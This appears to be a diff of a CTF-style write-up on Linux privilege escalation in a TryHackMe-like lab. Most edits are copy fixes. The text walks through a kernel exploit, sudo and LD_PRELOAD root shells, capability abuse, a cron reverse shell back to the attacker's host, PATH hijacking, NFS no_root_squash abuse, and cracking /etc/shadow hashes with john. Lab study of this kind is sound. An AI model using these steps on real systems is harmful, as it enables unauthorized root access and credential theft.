@@ -119,9 +119,9 @@ $ cat /proc/version
 Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
 
 ```
-The linux kernal version is **3.13.0-24-generic**, the vulnerability that can affect the kernal of the target system is -> [CVE-2015-1328](https://www.exploit-db.com/exploits/37292)
+The Linux kernel version is **3.13.0-24-generic**, the vulnerability that can affect the kernel of the target system is -> [CVE-2015-1328](https://www.exploit-db.com/exploits/37292)
 
-Download the exploitable into your machine and compile it. When I first compile it, it returned missing header error so I added these two header to the code: 
+Download the exploitable onto your machine and compile it. When I first compiled it, it returned a missing header error, so I added these two headers to the code: 
 ```c
 #define _GNU_SOURCE     // Required for clone() and unshare()
 #include <sys/wait.h>   // For wait(), waitpid()
@@ -130,7 +130,7 @@ Download the exploitable into your machine and compile it. When I first compile 
 ```bash
 ─$ gcc -static ofs.c -o of
 ```
-on the target machine, transfer the exploiter to `/tmp` folder so we can write our permission, then execut it.
+On the target machine, transfer the exploiter to `/tmp` folder so we can write our permission, then execute it.
 ```bash
 $ cd /tmp
 $ ls -l ofs     
@@ -168,8 +168,8 @@ User karen may run the following commands on ip-10-10-200-124:
 - injecting malicious environment variables (like `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, etc.)
 - affecting the behavior of sudo-executed commands
 
-`mail_badpass`: This tells sudo to send an email to the system administrator if a user enters an incorrect password when trying to run sudo. But the command `find`, `less`, and `nano` won't trigger this rule because the user can use it without password, thus we can exploit it to gain privileg escalation..
-This repo will help you in how to do the exploitation -> https://gtfobins.github.io
+`mail_badpass`: This tells sudo to send an email to the system administrator if a user enters an incorrect password when trying to run sudo. But the command `find`, `less`, and `nano` won't trigger this rule because the user can use it without a password, thus we can exploit it to gain privileg escalation..
+This repo will help you with how to do the exploitation -> https://gtfobins.github.io
 
 Abusing `find` command: 
 ```bash
@@ -180,17 +180,17 @@ root
 
 **Leverage LD_PRELOAD**
 
-But if this option `env_keep` is set in the sudoers, it will tells sudo which specific environment variables to preserve instead of resetting them.
+But if this option `env_keep` is set in the sudoers, it will tell sudo which specific environment variables to preserve instead of resetting them.
 
-Suppose this option set with: `env_keep += "LD_PRELOAD"`, `LD_PRELOAD` is an environment variable that tells the dynamic linker (the part of Linux that loads shared libraries when a program starts) to load your specified shared library before any others — even before system libraries like `libc.so`. In short, it lets you inject your own code into a program before it runs. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.
+Suppose this option is set with: `env_keep += "LD_PRELOAD"`, `LD_PRELOAD` is an environment variable that tells the dynamic linker (the part of Linux that loads shared libraries when a program starts) to load your specified shared library before any others, even before system libraries like `libc.so`. In short, it lets you inject your own code into a program before it runs. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.
 
 The steps of this privilege escalation vector can be summarized as follows;
 
 1. Check for LD_PRELOAD (with the env_keep option)
-2. Write a simple C code compiled as a share object (.so extension) file
+2. Write a simple C code compiled as a shared object (.so extension) file
 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
 
-Firt write a simple C code that will spawn a root shell, then compile it using `gcc` into a shared object file.
+First, write a simple C code that will spawn a root shell, then compile it using `gcc` into a shared object file.
 ```bash
 ─$ cat shell.c                                        
 #include <stdio.h>
@@ -212,7 +212,7 @@ shell.c  shell.so
 shell.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=d7387b7c4c9aaa4d9c5f6c574e4cdb1596fa09af, not stripped
 ```
 
-Now we can use this shared object file when launching any program our user can run with `sudo`. In our case, the user can use these commands: `find`, `less` and `nano`.
+Now we can use this shared object file when launching any program our user can run with `sudo`. In our case, the user can use these commands: `find`, `less`, and `nano`.
 
 ```bash
 ─$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
@@ -262,14 +262,11 @@ karen:Password1:1003:1003::/home/karen:/bin/sh
 
 ## Privilege Escalation: Capabilities
 
-**What Are Linux Capabilities?**
-
-In traditional Unix systems, processes run as either:
+**What Are Linux Capabilities?**: In traditional Unix systems, processes run as either:
 - Root (full privileges)
 - Non-root (limited privileges)
 
 Linux capabilities break up the full set of root privileges into smaller, fine-grained privileges that can be independently assigned to processes or binaries. This allows a non-root process to perform certain actions usually reserved for root.
-
 For example:
 - `CAP_NET_RAW`: Allows use of raw sockets.
 - `CAP_SYS_ADMIN`: Very powerful, close to full root access.
@@ -277,7 +274,6 @@ For example:
 
 
 In this task, you aren't required to run the exploit in order to get the flag, but for learning purpose, I will test exploiting binaries with set capabilities.
-
 Use `getcap` tool to list enabled capabilities. 
 
 ```bash
@@ -296,7 +292,7 @@ Both vim and view have the capability `cap_setuid+ep`, which means that when you
 
 I will test Vim and view capabilities. Change to the binary location directory and run the exploit.
 
-[Vim Capability abuse](https://gtfobins.github.io/gtfobins/vim/#capabilities): First, we need to identify Python version running on the target machine. *Prepend `:py3` for Python 3.*
+[Vim Capability abuse](https://gtfobins.github.io/gtfobins/vim/#capabilities): First, we need to identify the Python version running on the target machine. *Prepend `:py3` for Python 3.*
 ```bash
 $ python3 --version
 Python 3.8.5
@@ -306,7 +302,6 @@ Erase is control-H (^H).
 uid=0(root) gid=1001(karen) groups=1001(karen)
 ```
 The command used Vim to run Python code to escalate privileges with setuid(0) -> root, then launch a root shell with `os.execl`
-
 
 [view Capability abuse](https://gtfobins.github.io/gtfobins/view/#capabilities)
 
@@ -344,8 +339,8 @@ $ cat /etc/crontab
 * * * * *  root /home/karen/backup.sh
 * * * * *  root /tmp/test.py
 ```
-the asterisks, means that the scripts will run every minute of every hour of every day of every month, regardless of the day of the week. 
-I'm going to test both `test.py` and `backup.sh` script for a reverse shell.
+The asterisks mean that the scripts will run every minute of every hour of every day of every month, regardless of the day of the week. 
+I'm going to test both `test.py` and `backup.sh` scripts for a reverse shell.
 
 Starting with `test.py`.
 ```bash
@@ -356,7 +351,7 @@ drwxr-xr-x 19 root root 4096 Jul 15 10:48 ..
 drwxrwxrwt  2 root root 4096 Jul 15 10:47 .ICE-unix
 ```
 
-it's look like the `test.py` has been deleted, recreate it in the `tmp` folder and make sure to add the execution `chmod +x <file>` permission on both of the scripts, otherwise it wont be executed.
+It looks like the `test.py` has been deleted, recreate it in the `tmp` folder and make sure to add the execution `chmod +x <file>` permission on both of the scripts.
 
 Refrred to ->  [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 ```py
@@ -382,9 +377,9 @@ connect to [10.9.8.180] from (UNKNOWN) [10.10.237.210] 51296
 # whoami
 root
 ```
-Done!, we have successfully obtined a shell from the `test.py` scheduled task.
+Done! We have successfully gained a shell from the `test.py` scheduled task.
 
-Now for the `backup.sh` file, change it to this.
+Now, for the `backup.sh` file, change it to this.
 ```bash
 #!/bin/bash
 
@@ -399,15 +394,6 @@ root@ip-10-10-237-210:~# find / -name flag5.txt 2>/dev/null
 /home/ubuntu/flag5.txt
 ```
 
-To extract Matt's password, copy it's password hash from `/etc/shadow` and `/etc/passwd`. Then use `unshadow` tool
-```bash
-└─$ unshadow passwd.txt shadow.txt > hash.txt
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-└─$ john --show hash.txt                                     
-matt:123456:1002:1002::/home/matt:/bin/sh
-1 password hash cracked, 0 left
-```
-
 ## Privilege Escalation: PATH
 
 `PATH` is an environment variable that stores a list of directories. When you run a command like `ls` or `python`, Linux searches through the directories listed in `PATH` to find the executable for that command.
@@ -418,7 +404,7 @@ If there is a folder in **$PATH** (e.g. `/tmp` or `.`) that you can write to, th
 - You can create a fake version of any command (like `ls`, or `cat`) in that writable folder.
 - If a privileged user (like root) or a SUID binary relies on a command without specifying a full path, your fake script might get executed instead of the real one.
 
-this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
+This depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
 
 1. What folders are located under $PATH? 
 ```bash
@@ -444,7 +430,7 @@ drwxr-xr-x 2 root root 12288 Oct 26  2020 /usr/sbin
 
 3. Can you modify $PATH? 
 
-There is no writable folder, If we can modify it, then we need to add a writable folder to the `$PATH`, which is `/tmp` folder
+There is no writable folder. If we can modify it, then we need to add a writable folder to the `$PATH`, which is `/tmp` folder
 
 ```bash
 $ export PATH=/tmp:$PATH
@@ -456,7 +442,7 @@ drwxrwxrwt 11 root root 4096 Jul 15 12:52 /tmp
 
 4. Is there a script/application you can start that will be affected by this vulnerability?
 
-we will create a script named `test.c` that will tries to lunch a system binary called `exploiter`. 
+We will create a script named `test.c` that will try to launch a system binary called `exploiter`. 
 ```c
 #include<unistd.h>
 #include <stdlib.h>
@@ -474,9 +460,9 @@ $ chmod u+s test
 $ ls -l test
 -rwSrw-r--  1 karen karen 16056 Jul 15 13:35 test
 ```
-Once executed `test` will look for an executable named `exploiter` inside folders listed under `PATH`. As the SUID bit is set, this binary will run with root privilege
+Once executed, `test` will look for an executable named `exploiter` inside folders listed under `PATH`. As the SUID bit is set, this binary will run with root privileges
 
-Now, lets create the system binary that will be executed by the `test` binary in the `/tmp` folder. 
+Now, let's create the system binary that will be executed by the `test` binary in the `/tmp` folder. 
 ```bash
 $ echo "/bin/bash" > exploiter
 $ chmod 777 exploiter
@@ -490,12 +476,12 @@ $ ./test
 root@ip-10-10-224-225:/home/murdoch# whoami
 root
 ```
-> We have given executable rights to our copy of `/bin/bash`, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 
+We have given executable rights to our copy of `/bin/bash`, please note that at this point it will run with our user’s rights. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 
 
 
 ## Privilege Escalation: NFS
 
-This vector depend on a misconfigured network shell like NSF. the file `/etc/exports`, tells the NFS server which directories are being shared and how they're being shared.
+This vector depends on a misconfigured network shell like NSF. The file `/etc/exports`, tells the NFS server which directories are being shared and how they're being shared.
 ```bash
 $ cat /etc/exports
 # /etc/exports: the access control list for filesystems which may be exported
@@ -521,13 +507,13 @@ These files are being exported to all hosts (*) over the network, with the follo
 - `no_root_squash`   -> It means that if a remote user connects as root, they stay root.	
 - `no_subtree_check` -> Prevents subtree checking (used for performance).	
 
-By default, NFS downgrades the root user from a remote client to nobody user when accessing files (this is called root squashing). This prevents a remote root user from writing to sensitive files on the NFS server.
+By default, NFS downgrades the root user from a remote client to the nobody user when accessing files (this is called root squashing). This prevents a remote root user from writing to sensitive files on the NFS server.
 
 But with `no_root_squash`, that restriction is disabled — the remote root stays root on the shared directory. That means:
 
 If you can mount this **NFS share** and act as root on your system, you can create files owned by root or even upload a root-owned SSH key, giving you root shell access on the server.
 
-First Enumerate mountable shares from our machine.
+First, enumerate mountable shares from our machine.
 ```bash
 ─$ showmount -e 10.10.129.69
 Export list for 10.10.129.69:
@@ -536,14 +522,14 @@ Export list for 10.10.129.69:
 /home/backup              *
 ```             
 
-then mount on one of the `no_root_squash` shares to our machine and start building the executable. Write thse commands as a root user: 
+Then, mount one of the `no_root_squash` shares on our machine and start building the executable. Write these commands as a root user: 
 ```bash
-─# mkdir tmp-on-attacker-machine
-─# mount -o rw 10.10.129.69:/tmp /tmp/tmp-on-attacker-machine 
+mkdir tmp-on-attacker-machine
+mount -o rw 10.10.129.69:/tmp /tmp/tmp-on-attacker-machine 
 
 ```
 
-Creat an executable that will run `/bin/bash` on the target system.
+Create an executable that will run `/bin/bash` on the target system.
 
 test.c file:
 ```c                                                   
@@ -557,7 +543,7 @@ int main()
 }
 ```
 
-compile the test.c file and set SUID bits permission.
+Compile the test.c file and set the SUID bits permission.
 ```bash
 ─$ sudo su
 ─# nano test.c
@@ -575,7 +561,7 @@ total 20
 
 ```
 
-on the target machine:
+On the target machine:
 ```bash
 $ cd /tmp
 $ ls -l 
@@ -591,7 +577,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(karen)
 
 ## Capstone Challenge
 
-This task is to test your prvilege escalation skill. You have given an ssh access to the leonard machine, the task is to search for a privilege escalation vector.
+This task is to test your privilege escalation skill. You have been given SSH access to the Leonard machine. The task is to search for a privilege escalation vector.
 
 Start with the enumeration process
 ```bash
@@ -679,7 +665,7 @@ missy:x:1001:1001::/home/missy:/bin/bash
 [leonard@ip-10-10-232-53 ~]$ 
 ```
 
-Now, crack the passwords, copy both of /passwd and /shadow files, and save them.
+Now, crack the passwords, copy both /passwd and /shadow files, and save them.
 ```bash
 ─$ unshadow passwd.txt shadow.txt > hash.txt 
 ─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -690,7 +676,7 @@ missy:Password1:1001:1001::/home/missy:/bin/bash
 2 password hashes cracked, 0 left
 ```
 
-Login to the missy account, and look for vactors.
+Log in to the Missy account, and look for Vactors.
 ```bash
 [missy@ip-10-10-181-178 leonard]$ sudo -l
 Matching Defaults entries for missy on ip-10-10-181-178:
